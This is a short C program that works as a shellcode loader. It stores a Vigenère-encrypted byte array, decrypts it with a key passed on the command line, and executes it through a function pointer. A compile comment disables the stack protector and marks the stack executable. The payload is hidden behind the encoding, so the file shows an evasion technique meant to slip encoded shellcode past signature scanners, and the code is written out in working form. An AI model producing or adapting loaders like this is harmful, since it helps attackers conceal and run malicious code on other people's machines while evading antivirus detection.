// Compile with 'gcc -z execstack -fno-stack-protector vigenere.c -o vigenere
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xbc\xc2\xc7\xb7\x46\x8b\x0d\x74\xb9\xc8"
"\xb2\x7f\xc3\xa6\xb6\xa5\x8d\xdd\x3b\x4d"
"\x9f\x5e\xaf\x45\x9a\x6e\x4a\xac\x5e\x55"
"\xa3\x8d\xd9\xa2\x9f\xb3\xba\xd0\x3a\x54"
"\x35\x8b\x7b\x19\x9c\xe1\x83\x74\x62\x4a"
"\xad\x53\x9f\x9c\xe6\x9f\xaf\x62\x4a\xad"
"\x8e\x9d\x63\x59";

main(int argc, char ** argv)
{
	int keyLen, keyPtr;
	int ctLen, ctPtr;
	
	// Sanity Check
	if(argc < 2)
	{
		printf("Please provide a key string\n");
		return;
	}
 
 	// Set up pointers and limits
	char *key = argv[1];
	keyPtr = 0;
	keyLen = strlen(key);
	ctLen = strlen(code);
	
	// Perform the vigenere decode
	for(ctPtr=0; ctPtr < ctLen; ctPtr++)
	{
		code[ctPtr] = (code[ctPtr]-key[keyPtr])% 256;
		
		keyPtr++;
		if(keyPtr >= keyLen)
		{
			keyPtr=0;
		}
	
	}
	
	// Execute the shellcode
	void (*payload)() = (void(*)())code;
	payload();
}
